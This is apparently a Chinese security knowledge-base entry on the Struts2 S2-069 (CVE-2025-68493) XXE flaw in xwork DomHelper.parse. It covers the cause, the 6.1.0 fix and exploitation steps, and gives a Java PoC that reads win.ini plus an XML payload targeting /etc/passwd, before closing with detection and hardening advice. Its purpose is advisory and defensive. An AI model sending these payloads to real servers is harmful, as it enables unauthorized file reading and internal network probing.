---
id: web-java-framework-struts2-s2-069-domhelper-xxe
title: Struts2 S2-069 (CVE-2025-68493)：xwork DomHelper.parse XXE 文件读取
type: scenario
domain: web
path: web/java/framework/struts2
technique: struts2-domhelper-xxe
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
tags:
- java
- struts2
- xwork
- xxe
- xml
- file-read
- cve-2025-68493
cve:
- CVE-2025-68493
affected_versions: 6.0.3（6.1.0 已修复）
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T00:57:14+08:00'
  notes: 已对照原文核对 6.0.3 DomHelper.parse XXE 与 6.1.0 setFeature 修复；未验证点：原文仅库层单元测试读取 win.ini，未给出实际 HTTP 入口
url: /docs/web/java/framework/struts2/web-java-framework-struts2-s2-069-domhelper-xxe/
draft: false
kb_aliases:
- S2-069
- CVE-2025-68493
- Struts2 XXE
- DomHelper XXE
- xwork XXE
- Struts 6.0.3 XXE
---

## 一句话结论

Struts 6.0.3 的 xwork 组件 `DomHelper.parse()` 创建 `SAXParserFactory` 时未关闭外部实体解析，攻击者控制的 XML 可通过 `<!ENTITY ... SYSTEM "file:///...">` 读取服务器本地文件；6.1.0 通过设置 `external-general-entities`/`external-parameter-entities` 为 `false` 修复（S2-069 / CVE-2025-68493）。

## 原理

- `com.opensymphony.xwork2.util.DomHelper#parse` 负责把 `InputSource` 解析为 `Document`。6.0.3 中它调用 `SAXParserFactory.newInstance()` 后只设置 `validating`/`namespaceAware`，没有禁用 DTD 与外部实体。
- 默认的 JAXP/SAX 解析器会处理 `<!DOCTYPE ...>` 与 `<!ENTITY name SYSTEM "uri">`，在解析时解析 `SYSTEM` 指向的外部资源，并把实体内容替换到文档节点中。
- 当攻击者能控制传入 `DomHelper.parse` 的 XML 时，构造外部实体指向 `file:///C:/Windows/win.ini`（或 Linux `/etc/passwd`），解析后读取根节点文本即可获得文件内容；也可指向内网 HTTP 服务形成 SSRF。
- 6.1.0 的修复在创建 factory 后执行：
  ```java
  factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
  factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
  ```
  若解析器不支持这些特性则抛出异常（fail closed），从而阻止外部实体解析。
- 漏洞利用需要业务存在“把用户可控 XML 交给 `DomHelper.parse`”的入口（Struts2 中解析 XML 配置/请求的组件）；原文在库层面直接调用 `DomHelper.parse` 验证了 XXE 原语。

## 触发条件

1. 目标使用 Struts/xwork 6.0.3（或 6.1.0 之前的受影响版本）。
2. 存在将攻击者可控 XML 传入 `DomHelper.parse` 的业务路径（XML 接口、配置解析、SOAP/RSS 等）。
3. 解析器未通过 JVM 系统属性或自定义 `SAXParserFactory` 禁用外部实体。
4. 目标进程对要读取的文件有读权限；SSRF 场景需可出网/访问内网。

## 利用步骤

1. 确认 Struts 版本（响应头、错误页、`/struts` 资源、jar 指纹）。
2. 定位接受 XML 的接口或组件，确认其解析路径经过 `DomHelper.parse`。
3. 构造带外部实体的 XML，`SYSTEM` 指向目标文件或内网 URL。
4. 提交 XML，观察响应/回显中是否出现文件内容或外部请求。
5. 若无可直接回显，使用 OOB（外部 DTD/HTTP）带外读取或 SSRF 探测。

## PoC

直接调用库验证（原文 PoC）：

```java
String uri = "C:\\Windows\\win.ini";
String xml =
    "<?xml version=\"1.0\"?>\n" +
    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"" + uri + "\">]>\n" +
    "<foo>&xxe;</foo>";

InputSource in = new InputSource(new StringReader(xml));
Document doc = DomHelper.parse(in);
String res = doc.getDocumentElement().getTextContent();
System.out.println(res);
```

6.0.3 输出 win.ini 内容（`for 16-bit app support [fonts] ...`）；6.1.0 中外部实体被禁用，结果为空白/不解析。

HTTP 场景载荷：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

## 变体与关联

- 除文件读取外，`SYSTEM` 可指向 `http://internal/...` 形成 SSRF，或使用参数实体 + 外部 DTD 做 OOB 数据外带。
- 同类 XXE 修复也可通过 JVM 参数完成：`-Djavax.xml.accessExternalDTD=""`、`-Djavax.xml.accessExternalSchema=""`、`-Djavax.xml.accessExternalStylesheet=""`，或自定义 `SAXParserFactory`（`xwork.saxParserFactory` 系统属性）。
- 与 Struts2 的 OGNL 系列漏洞不同，本漏洞是 XML 解析层 XXE，不涉及表达式执行。
- 其他使用 JAXP 默认配置解析 XML 的组件也可能存在同类问题。

## 检测与防御

- 升级到 6.1.0+（修复版本）；无法升级时按官方 workaround 配置自定义 `SAXParserFactory` 或 JVM 级 `accessExternal*` 属性为空。
- 所有 XML 解析统一禁用 DTD/外部实体：`disallow-doctype-decl`、`external-general-entities=false`、`external-parameter-entities=false`、`XMLConstants.FEATURE_SECURE_PROCESSING=true`。
- 代码审计搜索 `DomHelper.parse`、`SAXParserFactory.newInstance`、`DocumentBuilderFactory.newInstance` 等未加固的 XML 解析点。
- WAF 拦截包含 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM` 的 XML 请求；对 XML 接口做内容类型与结构校验。
- 监控异常文件读取与内网出站请求，限制 Web 进程对敏感文件的访问权限。
